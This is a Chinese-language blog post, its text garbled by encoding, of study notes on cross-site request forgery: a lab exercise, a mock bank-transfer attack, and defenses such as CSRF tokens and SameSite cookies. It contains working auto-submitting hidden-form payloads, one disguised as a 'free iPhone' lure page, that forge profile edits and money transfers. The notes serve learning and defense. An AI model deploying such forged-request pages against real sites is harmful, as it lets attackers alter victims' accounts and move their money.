<p>æ—¢ç„¶è¿™æ ·çš„è¯é‚£å°±ä¸èƒ½å’Œä¸Šä¸€å…³ä¸€æ ·ä½¿ç”¨urlä¼ªé€ çš„æ–¹æ³•äº†</p>
<p>é‚£æˆ‘ä»¬å°±ç”¨å’Œxssæ¼æ´ç›¸ä¼¼çš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªæ¶æ„ç«™ç‚¹ï¼Œå°†POSTè¯·æ±‚éšè—åœ¨ç«™ç‚¹ä¸­çš„è¡¨å•ä¸­ï¼Œç„¶åè¯±å¯¼è¿™ä¸ªç”¨æˆ·ç‚¹å‡»æˆ‘ä»¬çš„æ¶æ„ç«™ç‚¹ï¼Œå½“ç”¨æˆ·ç‚¹å‡»åè§¦å‘è¡¨å•ï¼Œæ•°æ®å°±ä¼šè¢«postè¾¾åˆ°å­˜åœ¨csrfæ¼æ´çš„ç½‘ç«™ï¼Œç”¨æˆ·ä¿¡æ¯å°±ä¼šè¢«æ¶æ„ä¿®æ”¹</p>
<p>æ ¹æ®åŸæœ¬ç½‘ç«™ç•Œé¢çš„è¡¨å•æ„é€ æˆ‘ä»¬çš„postè¯·æ±‚</p>
<p><img src="/2025/07/09/1zweb/60f9c40d63908366f9bf0f0eafb807c.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;                                                                                                       &lt;!-- è¿™ä¸ªscriptæ˜¯ç”¨æ¥è‡ªåŠ¨æäº¤è¡¨å•çš„ --&gt;</span><br><span class="line">        window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;submit&quot;).click();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;              </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">            &lt;form action=&quot;http://www.pikachu.com:90/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;    </span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;123456789&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;caker@pikachu.com&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">              &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit request&quot; style=&quot;display:none&quot;/&gt;                    &lt;!-- styleè®¾ç½®ä¸ºdisplay:noneèµ·åˆ°éšè—submitæŒ‰é’®çš„ä½œç”¨ --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯æœ¬æœºæ“ä½œæ‰€ä»¥å°±æŠŠè¿™ä¸ªcsrf.htmlæ–‡ä»¶æ”¾åœ¨é¶åœºåº•ä¸‹çš„ä¸€ä¸ªç›®å½•å³å¯</p>
<p>ç„¶åè®¿é—®è¿™ä¸ªç«™ç‚¹ï¼Œç‚¹å‡»æäº¤æŒ‰é’®å³å¯ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä¸€ç›´è®¿é—®ä¸äº†æˆ‘å†™å¥½çš„è¿™ä¸ªhtmlæ–‡ä»¶</p>
<p>åˆ°åº•å“ªé‡Œå‡ºäº†é—®é¢˜ï¼ï¼ï¼ï¼ï¼</p>
<p>æ²¡å…³ç³»åæ­£æ˜¯æœ¬æœºæ¼”ç»ƒå­¦æ‡‚å°±è¡Œ</p>
<h4 id="å®ä¾‹æ¼”ç¤º-1"><a href="#å®ä¾‹æ¼”ç¤º-1" class="headerlink" title="å®ä¾‹æ¼”ç¤º"></a>å®ä¾‹æ¼”ç¤º</h4><p><strong>åœºæ™¯å‡çº§ï¼šé“¶è¡Œæ”¹è¿›äº†ç³»ç»Ÿ</strong></p>
<p>å‡è®¾é“¶è¡Œ <code>vulnerable-bank.com</code> å¬å–äº†å®‰å…¨å»ºè®®ï¼Œå°†è½¬è´¦åŠŸèƒ½ä»<strong>GETè¯·æ±‚å‡çº§ä¸ºäº†POSTè¯·æ±‚</strong>ã€‚</p>
<ol>
<li><strong>è½¬è´¦åŠŸèƒ½URLï¼š</strong><br><code>http://vulnerable-bank.com/transfer</code> (ä¸å˜)</li>
<li><strong>è¯·æ±‚æ–¹å¼ï¼š</strong><br><code>POST</code></li>
<li><strong>è¯·æ±‚å‚æ•°ï¼š</strong><br>é€šè¿‡è¯·æ±‚ä½“ï¼ˆBodyï¼‰å‘é€ï¼Œä¾‹å¦‚ï¼š<code>to=mallory_account&amp;amount=1000</code></li>
</ol>
<p>ç°åœ¨ï¼Œç”¨æˆ·Aliceé€šè¿‡ä¸€ä¸ªè¡¨å•æ¥è¿›è¡Œè½¬è´¦ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- é“¶è¡Œæ­£å¸¸çš„è½¬è´¦è¡¨å• --&gt;</span><br><span class="line">&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;label for=&quot;to&quot;&gt;æ”¶æ¬¾è´¦æˆ·ï¼š&lt;/label&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; id=&quot;to&quot; name=&quot;to&quot;&gt;&lt;br&gt;</span><br><span class="line">  &lt;label for=&quot;amount&quot;&gt;é‡‘é¢ï¼š&lt;/label&gt;</span><br><span class="line">  &lt;input type=&quot;number&quot; id=&quot;amount&quot; name=&quot;amount&quot;&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;è½¬è´¦&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™çœ‹èµ·æ¥æ›´å®‰å…¨äº†ï¼Œå› ä¸ºURLé‡Œä¸å†åŒ…å«æ•æ„Ÿå‚æ•°ã€‚ä½†æ˜¯ï¼Œå¦‚æœé“¶è¡Œæ²¡æœ‰å®æ–½å…¶ä»–é˜²å¾¡æªæ–½ï¼ˆå¦‚CSRF Tokenï¼‰ï¼Œå®ƒä¾ç„¶æ˜¯ä¸å®‰å…¨çš„ã€‚</p>
<p><strong>æ”»å‡»è€…å¦‚ä½•æ„é€ POSTè¯·æ±‚ï¼Ÿ</strong></p>
<p>æ”»å‡»è€…Malloryæ— æ³•ä½¿ç”¨ <img> æ ‡ç­¾äº†ï¼ˆå› ä¸ºå®ƒåªä¼šå‘èµ·GETè¯·æ±‚ï¼‰ã€‚ä½†å¥¹å¯ä»¥ä½¿ç”¨ä¸€ä¸ªéšè—çš„å¹¶ä¼šè‡ªåŠ¨æäº¤çš„HTMLè¡¨å•ã€‚</p>
<p>å¥¹å°†ä»¥ä¸‹ä»£ç éƒ¨ç½²åœ¨è‡ªå·±çš„æ¶æ„ç½‘ç«™ä¸Šï¼ˆ<a href="http://evil-website.comï¼‰ï¼š">http://evil-website.comï¼‰ï¼š</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;èµ¢å–å…è´¹iPhoneï¼&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;æ­å–œä½ ï¼ä½ æ˜¯ç¬¬100ä¸‡ä½è®¿å®¢ï¼&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;ç‚¹å‡»ä¸‹æ–¹é“¾æ¥ï¼Œå³å¯èµ¢å–å…è´¹iPhoneï¼&lt;/p&gt;</span><br><span class="line">    &lt;!-- å…¶ä»–èŠ±é‡Œèƒ¡å“¨çš„å†…å®¹å¸å¼•ç”¨æˆ·æ³¨æ„åŠ› --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- éšè—çš„è‡ªåŠ¨æäº¤è¡¨å• - POSTå‹CSRFè½½è· --&gt;</span><br><span class="line">    &lt;form id=&quot;maliciousForm&quot; action=&quot;http://vulnerable-bank.com/transfer&quot; method=&quot;POST&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;mallory_account&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;1000&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // é¡µé¢åŠ è½½å®Œæˆåï¼Œè‡ªåŠ¨æäº¤è¡¨å•</span><br><span class="line">        document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123;</span><br><span class="line">            document.getElementById(&#x27;maliciousForm&#x27;).submit();</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>å…³é”®è§£é‡Šï¼š<form></p>
<p> æ ‡ç­¾ï¼š å®šä¹‰äº†è¿™æ˜¯ä¸€ä¸ªè¡¨å•ï¼Œaction æŒ‡å‘é“¶è¡Œçš„è½¬è´¦æ¥å£ï¼Œmethod è®¾ç½®ä¸º POSTã€‚</p>
<p>style&#x3D;â€display: none;â€ å°†å…¶éšè—ã€‚</p>
<p><input type="hidden">ï¼š è¿™äº›æ˜¯éšè—çš„è¡¨å•å­—æ®µï¼Œé¢„å¡«å¥½äº†æ”»å‡»å‚æ•°ï¼ˆæ”¶æ¬¾è´¦æˆ·å’Œé‡‘é¢ï¼‰ã€‚ç”¨æˆ·çœ‹ä¸åˆ°ä¹Ÿæ— æ³•ä¿®æ”¹å®ƒä»¬ã€‚</p>
<p><code>script</code>æ ‡ç­¾ï¼š åŒ…å«äº†ä¸€å°æ®µJavaScriptä»£ç ï¼Œå®ƒåœ¨é¡µé¢åŠ è½½å®Œæˆï¼ˆDOMContentLoadedï¼‰åï¼Œä¼šè‡ªåŠ¨æäº¤ï¼ˆsubmit()ï¼‰è¿™ä¸ªéšè—çš„è¡¨å•ã€‚</p>
<p><strong>ç¬¬ 3 æ­¥ï¼šæ”»å‡»å‘ç”Ÿæµç¨‹ (POSTç‰ˆæœ¬)</strong></p>
<p>1.è¯±å¯¼ï¼š å’Œä¹‹å‰ä¸€æ ·ï¼ŒAlice è¢«è¯±éª—è®¿é—®äº† <a target="_blank" rel="noopener" href="http://evil-website.com./">http://evil-website.comã€‚</a></p>
<p>2.åŠ è½½ä¸æ‰§è¡Œï¼š æµè§ˆå™¨åŠ è½½æ¶æ„é¡µé¢ã€‚é¡µé¢æ¸²æŸ“å®Œæˆåï¼ŒJavaScriptä»£ç æ‰§è¡Œã€‚</p>
<p>3.å‘é€è¯·æ±‚ï¼š JavaScriptå‘½ä»¤æµè§ˆå™¨å‘ <a target="_blank" rel="noopener" href="http://vulnerable-bank.com/transfer">http://vulnerable-bank.com/transfer</a> æäº¤ä¸€ä¸ª POST è¯·æ±‚ã€‚è¯·æ±‚ä½“ä¸­åŒ…å«äº†æ•°æ® to&#x3D;mallory_account&amp;amount&#x3D;1000ã€‚</p>
<p>4.æºå¸¦Cookieï¼š æœ€å…³é”®çš„ä¸€æ­¥ä¾ç„¶å‘ç”Ÿï¼ æµè§ˆå™¨åœ¨å‘èµ·è¿™ä¸ªè·¨ç«™çš„POSTè¯·æ±‚æ—¶ï¼Œä¾ç„¶ä¼šè‡ªåŠ¨åœ°ã€åˆæ³•åœ°å°†Aliceçš„ä¼šè¯Cookieé™„åŠ åœ¨è¯·æ±‚å¤´ä¸­ã€‚</p>
<p>5.æœåŠ¡å™¨éªŒè¯ï¼š é“¶è¡ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼š</p>
<p>æœåŠ¡å™¨æ£€æŸ¥Cookieï¼Œæœ‰æ•ˆï¼è¿™æ˜¯åˆæ³•çš„ç”¨æˆ·Aliceå‘æ¥çš„POSTè¯·æ±‚ã€‚æœåŠ¡å™¨æ¬£ç„¶æ‰§è¡Œè½¬è´¦æ“ä½œã€‚</p>
<p>6.æ”»å‡»å®Œæˆï¼š Aliceçš„æµè§ˆå™¨å¯èƒ½ä¼šè·³è½¬åˆ°é“¶è¡Œè½¬è´¦æˆåŠŸçš„é¡µé¢ï¼Œæˆ–è€…åœç•™åœ¨æ¶æ„ç½‘ç«™ï¼ˆå–å†³äºè¡¨å•çš„targetå±æ€§ï¼‰ã€‚æ— è®ºå“ªç§æƒ…å†µï¼Œè½¬è´¦æ“ä½œéƒ½å·²ç»åœ¨åå°é™é»˜å®Œæˆã€‚</p>
<h2 id="CSRFæ¼æ´çš„æŒ–æ˜"><a href="#CSRFæ¼æ´çš„æŒ–æ˜" class="headerlink" title="CSRFæ¼æ´çš„æŒ–æ˜"></a>CSRFæ¼æ´çš„æŒ–æ˜</h2><p>1ã€æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå¦‚æœæ²¡æœ‰Refererå­—æ®µå’Œtokenï¼Œé‚£ä¹ˆææœ‰å¯èƒ½å­˜åœ¨CSRFæ¼æ´ã€‚</p>
<p>2ã€å¦‚æœæœ‰Refererå­—æ®µï¼Œä½†æ˜¯å»æ‰Refererå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´ã€‚</p>
<p><img src="/2025/07/09/1zweb/eepseek_mermaid_20250824_a89491.png" alt="img"></p>
<h2 id="CSRFæ¼æ´çš„é˜²å¾¡"><a href="#CSRFæ¼æ´çš„é˜²å¾¡" class="headerlink" title="CSRFæ¼æ´çš„é˜²å¾¡"></a>CSRFæ¼æ´çš„é˜²å¾¡</h2><p>é˜²å¾¡å››å¤§é‡‘åˆšï¼ˆä»å¼ºåˆ°å¼±æ¨èï¼‰</p>
<h4 id="CSRF-Tokenï¼ˆé˜²ä¼ªå°ç« ï¼‰"><a href="#CSRF-Tokenï¼ˆé˜²ä¼ªå°ç« ï¼‰" class="headerlink" title="CSRF Tokenï¼ˆé˜²ä¼ªå°ç« ï¼‰"></a>CSRF Tokenï¼ˆé˜²ä¼ªå°ç« ï¼‰</h4><p>æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p> ä¸€ä¸ªæœåŠ¡å™¨ç”Ÿæˆçš„ã€éšæœºä¸”å¤æ‚çš„å­—ç¬¦ä¸²ï¼ˆä»¤ç‰Œï¼‰ã€‚æ¯ä¸ªç”¨æˆ·ä¼šè¯çš„Tokenéƒ½ä¸åŒï¼Œå¹¶ä¸”ä¸å½“å‰ä¼šè¯ç»‘å®šã€‚</p>
<p>æ€ä¹ˆå·¥ä½œï¼Ÿ</p>
<p>1.å‘å°ç« ï¼š æœåŠ¡å™¨åœ¨æ˜¾ç¤ºè¡¨å•ï¼ˆæˆ–é¡µé¢ï¼‰æ—¶ï¼Œç”Ÿæˆä¸€ä¸ªTokenï¼Œè—åœ¨è¡¨å•é‡Œï¼ˆå¦‚ä¸€ä¸ª <input type="hidden">ï¼‰ï¼ŒåŒæ—¶æŠŠè¿™ä¸ªTokenè®°åœ¨æœåŠ¡å™¨ä¸Šï¼ˆå¦‚Sessioné‡Œï¼‰ã€‚</p>
<p>æ¯”å¦‚è¯´ï¼Œåœ¨åˆšåˆšçš„é¶åœºé‡Œé¢ç”¨æˆ·liliæƒ³è¦ä¿®æ”¹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼Œé‚£åœ¨liliç‚¹å‡»è¿™ä¸ªä¿®æ”¹ä¸ªäººä¿¡æ¯çš„é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨åœ¨æ˜¾ç¤ºä¿®æ”¹ä¿¡æ¯è¿™ä¸ªç•Œé¢æ—¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªtokenï¼Œéšè—åœ¨è¿”å›ç»™ç”¨æˆ·çš„ç•Œé¢é‡Œï¼Œé¡ºä¾¿è®°å½•ä¸‹è¿™ä¸ªtokenï¼Œæ¯æ¬¡åˆ·æ–°è¿™ä¸ªä¿®æ”¹ä¿¡æ¯çš„ç•Œé¢æ—¶éƒ½ä¼šæ–°ç”Ÿæˆæ–°çš„token</p>
<p><img src="/2025/07/09/1zweb/38504959dfcfc2c1b8d168dcc1a7c40.png" alt="img"></p>
<p>2.ç›–å°ç« ï¼š ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œè¿™ä¸ªTokenä¼šéšç€è¯·æ±‚ä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚</p>
<p>æ¯”å¦‚è¯´ï¼Œç”¨æˆ·liliå·²ç»ä¿®æ”¹å®Œè‡ªå·±çš„ä¸ªäººä¿¡æ¯äº†ï¼Œéœ€è¦æäº¤ï¼Œæäº¤çš„åŒæ—¶é‚£ä¸ªéšè—çš„tokenä¹Ÿä¼šä¸€èµ·å‘ç»™æœåŠ¡å™¨</p>
<p><img src="/2025/07/09/1zweb/bf6c2f52fcf8b79a6d463c31f310f55.png" alt="img"></p>
<p>3.éªŒå°ç« ï¼š æœåŠ¡å™¨æ¯”è¾ƒç”¨æˆ·æäº¤çš„Tokenå’Œè‡ªå·±è®°ä¸‹çš„Tokenæ˜¯å¦ä¸€è‡´ã€‚</p>
<p>ä¸€è‡´ â†’ æ˜¯è‡ªå·±äººï¼Œæ‰§è¡Œæ“ä½œã€‚</p>
<p>ä¸ä¸€è‡´æˆ–æ²¡æœ‰ â†’ æ˜¯ä¼ªé€ çš„è¯·æ±‚ï¼Œç›´æ¥æ‹’ç»ï¼</p>
<p>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ</p>
<p>åäººçš„ç½‘ç«™æ— æ³•çŸ¥é“è¿™ä¸ªTokenæ˜¯ä»€ä¹ˆï¼ˆå› ä¸ºæµè§ˆå™¨åŒæºç­–ç•¥ï¼Œä»–è¯»ä¸åˆ°ä½ çš„é¡µé¢å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ä»–ä¼ªé€ çš„è¯·æ±‚é‡Œæ°¸è¿œç¼ºå°‘æ­£ç¡®çš„â€œå°ç« â€ã€‚</p>
<p>è¿™ä¸ªé˜²å¾¡å­¦å®Œï¼Œæˆ‘æƒ³åˆ°å‰é¢è¯´çš„csrfçš„æ”»å‡»åŸç† ï¼Œå†’å‡ºæ¥ä¸€ä¸ªé—®é¢˜</p>
<p>é‚£ä¸ªtokenä¸æ˜¯è—åœ¨ç”¨æˆ·çš„ä¼šè¯sessionä¸­å—ï¼Œå—å®³è€…åœ¨ç‚¹å‡»äº†æ”»å‡»è€…çš„é“¾æ¥å‘èµ·è¯·æ±‚æ—¶æµè§ˆå™¨ä¸æ˜¯ä¼šè‡ªå¸¦ä¸Šç”¨æˆ·çš„ä¼šè¯sessionå—ï¼Œä¸ºä»€ä¹ˆæ”»å‡»è€…æ²¡æœ‰ç”¨æˆ·çš„Tokenï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p><img src="/2025/07/09/1zweb/8f6a255c53883bdcbf1e99f0671cd34.png" alt="img"></p>
<p>è¿™æ ·çœ‹æ¥ï¼ŒTokenç¡®å®å¾ˆå¼ºå¤§ï¼</p>
<h4 id="SameSite-Cookieï¼ˆç®¡å®¶è®¤é—¨ï¼‰"><a href="#SameSite-Cookieï¼ˆç®¡å®¶è®¤é—¨ï¼‰" class="headerlink" title="SameSite Cookieï¼ˆç®¡å®¶è®¤é—¨ï¼‰"></a>SameSite Cookieï¼ˆç®¡å®¶è®¤é—¨ï¼‰</h4><p>è¿™ç§æ–¹æ³•ä¸æ”¹å˜è¯·æ±‚æœ¬èº«ï¼Œè€Œæ˜¯è§„èŒƒæµè§ˆå™¨çš„è¡Œä¸ºã€‚</p>
<p>æ˜¯ä»€ä¹ˆï¼Ÿ </p>
<p>å®ƒæ˜¯Cookieçš„ä¸€ä¸ªå±æ€§ï¼Œå‘Šè¯‰æµè§ˆå™¨åœ¨ä»€ä¹ˆæƒ…å†µä¸‹æ‰èƒ½å‘é€è¿™ä¸ªCookieã€‚</p>
<p>æ€ä¹ˆå·¥ä½œï¼Ÿ </p>
<p>æœåŠ¡å™¨åœ¨è®¾ç½®ç™»å½•Cookieæ—¶ï¼Œç»™å®ƒåŠ ä¸Šä¸€ä¸ªâ€œæŒ‡ä»¤â€ï¼š</p>
<ol>
<li>SameSite&#x3D;Strictï¼ˆæœ€ä¸¥æ ¼ï¼‰ï¼šåªè®¤è‡ªå®¶é—¨ã€‚ åªæœ‰ä»é“¶è¡Œç½‘ç«™å‘å‡ºçš„è¯·æ±‚ï¼Œæ‰å¸¦Cookieã€‚ä»æ¶æ„ç½‘ç«™å‘çš„è¯·æ±‚ï¼Œç»å¯¹ä¸å¸¦ã€‚</li>
<li>SameSite&#x3D;Laxï¼ˆå®½æ¾ï¼Œç°ä»£æµè§ˆå™¨çš„é»˜è®¤å€¼ï¼‰ï¼šè®¤è‡ªå®¶é—¨ï¼Œä¹Ÿè®¤æœ‹å‹çš„é—¨ã€‚ å…è®¸ä»å…¶ä»–ç½‘ç«™é“¾æ¥è¿‡æ¥æ—¶çš„GETè¯·æ±‚å¸¦Cookieï¼ˆæ¯”å¦‚æ­£å¸¸è·³è½¬ï¼‰ï¼Œä½†ç¦æ­¢ä¸å®‰å…¨çš„è·¨ç«™POSTè¯·æ±‚å¸¦Cookieã€‚èƒ½é˜²å¾¡ç»å¤§å¤šæ•°CSRFæ”»å‡»ã€‚</li>
<li>SameSite&#x3D;Noneï¼šè°çš„é—¨éƒ½è®¤ã€‚ ä»»ä½•æƒ…å†µéƒ½å¸¦Cookieï¼Œå¿…é¡»ä¸ Secure å±æ€§ï¼ˆåªé€šè¿‡HTTPSä¼ è¾“ï¼‰ä¸€åŒä½¿ç”¨ã€‚</li>
</ol>
<p>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ </p>
<p>å®ƒç›´æ¥ä»æ ¹æºä¸Šåˆ‡æ–­äº†æ”»å‡»é“¾æ¡ã€‚å³ä½¿åäººä¼ªé€ äº†è¯·æ±‚ï¼Œæµè§ˆå™¨ä¹Ÿå› ä¸ºâ€œè®¤é—¨â€è§„åˆ™è€Œæ‹’ç»å‘é€ç”¨æˆ·çš„èº«ä»½Cookieï¼Œå¯¼è‡´è¯·æ±‚æ²¡æœ‰æƒé™ã€‚</p>
<p>æœåŠ¡å™¨è®¾ç½®Cookieæ—¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<h4 id="éªŒè¯è¯·æ±‚æ¥æºï¼ˆReferer-Originå¤´ï¼‰ï¼ˆæŸ¥å¿«é€’å•ï¼‰"><a href="#éªŒè¯è¯·æ±‚æ¥æºï¼ˆReferer-Originå¤´ï¼‰ï¼ˆæŸ¥å¿«é€’å•ï¼‰" class="headerlink" title="éªŒè¯è¯·æ±‚æ¥æºï¼ˆReferer&#x2F;Originå¤´ï¼‰ï¼ˆæŸ¥å¿«é€’å•ï¼‰"></a>éªŒè¯è¯·æ±‚æ¥æºï¼ˆReferer&#x2F;Originå¤´ï¼‰ï¼ˆæŸ¥å¿«é€’å•ï¼‰</h4><p>æ£€æŸ¥è¯·æ±‚æ˜¯ä»å“ªé‡Œæ¥çš„ã€‚</p>
<p>æ˜¯ä»€ä¹ˆï¼Ÿ æ£€æŸ¥HTTPå¤´ä¸­çš„ Referer æˆ– Origin å­—æ®µï¼Œçœ‹æ˜¯å¦æ¥è‡ªåˆæ³•çš„ã€è‡ªå·±çš„ç½‘ç«™ã€‚</p>
<p>æ€ä¹ˆå·¥ä½œï¼Ÿ</p>
<p>åˆæ³•æ¥æºï¼š Referer: <a target="_blank" rel="noopener" href="https://your-bank.com/change_email">https://your-bank.com/change_email</a> â†’ é€šè¿‡ã€‚</p>
<p>éæ³•æ¥æºï¼š Referer: <a target="_blank" rel="noopener" href="https://evil.com/">https://evil.com</a> æˆ–æ²¡æœ‰æ¥æºå¤´ â†’ æ‹’ç»ã€‚</p>
<p>ç¼ºç‚¹ï¼š</p>
<p>æœ‰äº›ç”¨æˆ·å‡ºäºéšç§ä¼šç¦ç”¨Refererå¤´ã€‚</p>
<p>é…ç½®ä¸å¥½å¯èƒ½è¢«ç»•è¿‡ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœåªæ£€æŸ¥åŸŸåæ˜¯å¦åŒ…å« your-bank.comï¼Œåäººå¯ä»¥ç”¨ evil.com&#x2F;your-bank.com æ¥ç»•è¿‡ï¼‰ã€‚</p>
<p>é€šå¸¸ä½œä¸ºç¬¬äºŒé“é˜²çº¿ï¼Œè€Œä¸æ˜¯å”¯ä¸€é˜²çº¿ã€‚</p>
<h4 id="ä½¿ç”¨è‡ªå®šä¹‰Headerï¼ˆæš—å·ï¼‰"><a href="#ä½¿ç”¨è‡ªå®šä¹‰Headerï¼ˆæš—å·ï¼‰" class="headerlink" title="ä½¿ç”¨è‡ªå®šä¹‰Headerï¼ˆæš—å·ï¼‰"></a>ä½¿ç”¨è‡ªå®šä¹‰Headerï¼ˆæš—å·ï¼‰</h4><p>éƒ½è¯´æ˜¯æš—å·äº†</p>
<p>å¸¸ç”¨äºå‰åç«¯åˆ†ç¦»ï¼ˆAPIï¼‰çš„åº”ç”¨ã€‚</p>
<p>æ˜¯ä»€ä¹ˆï¼Ÿ è®©å‰ç«¯JavaScriptåœ¨è¯·æ±‚æ—¶ï¼Œè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„Headerï¼ˆä¾‹å¦‚ X-Requested-With: XMLHttpRequestï¼‰ã€‚</p>
<p>æ€ä¹ˆå·¥ä½œï¼Ÿ æœåŠ¡å™¨æ£€æŸ¥è¿™ä¸ªHeaderæ˜¯å¦å­˜åœ¨ã€‚</p>
<p>ä¸ºä»€ä¹ˆæœ‰æ•ˆï¼Ÿ æµè§ˆå™¨çš„åŒæºç­–ç•¥è§„å®šï¼šåäººçš„ç½‘ç«™æ— æ³•é€šè¿‡JavaScriptä¸ºè·¨åŸŸè¯·æ±‚è®¾ç½®è‡ªå®šä¹‰Headerã€‚</p>
<p>å‰æï¼š è¿™ç§æ–¹å¼è¦æ±‚ä½ çš„è¯·æ±‚æ˜¯é€šè¿‡AJAXå‘å‡ºçš„ï¼Œå¹¶ä¸”éœ€è¦é…ç½®CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰ã€‚å¯¹äºä¼ ç»Ÿçš„è¡¨å•æäº¤æ— æ•ˆã€‚</p>

    </article>
    
    <div class="read-nums">
      <!-- id å°†ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ -->
      <span id="2025/08/24/CSRF/" class="leancloud_visitors" data-flag-title="Your Article Title">
        <em class="post-meta-item-text">æµè§ˆé‡</em>
        <i class="leancloud-visitors-count"></i>
      </span>
    </div>
    <div class="comments-intro">
      <h2>è¯„è®ºåŒº</h2>
      <p>æ¬¢è¿ä½ ç•™ä¸‹å®è´µçš„æ„è§ï¼Œæ˜µç§°è¾“å…¥QQå·ä¼šæ˜¾ç¤ºQQå¤´åƒå“¦~</p>
    </div>
    <div id="vcomments" class="vcomments"></div>
    
  </div>
  <div class="article-catelogue">
    <div class="article-catelogue--wrapper">
      <div class="catelogue catelogue-1">
        <h3>ç›®å½•</h3>
